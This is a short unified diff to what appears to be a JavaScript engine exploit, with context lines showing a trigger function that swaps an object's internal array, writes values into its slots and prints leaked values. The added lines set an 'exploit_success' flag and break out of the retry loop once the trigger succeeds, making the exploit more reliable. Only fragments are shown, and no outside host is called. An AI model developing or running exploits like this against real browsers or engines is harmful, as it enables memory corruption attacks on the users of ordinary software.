@@ -93,6 +93,8 @@
             return ans; 
         } 
         
+        var exploit_success = false;
+        
         function trigger(x) { 
             if(impl.a !== target) { 
                 return; 
@@ -124,6 +126,7 @@
             impl.a[5] = s2; 
             impl.a = target; 
             print([l1, l2, s1, s2]); 
+            exploit_success = true;
         } 
         
         try { 
@@ -132,6 +135,9 @@
                 var impl = create_impl(); 
                 var s = {a: impl}; 
                 trigger(s); 
+                if(exploit_success) {
+                    break;
+                }
             } 
         } catch(e) { 
         }
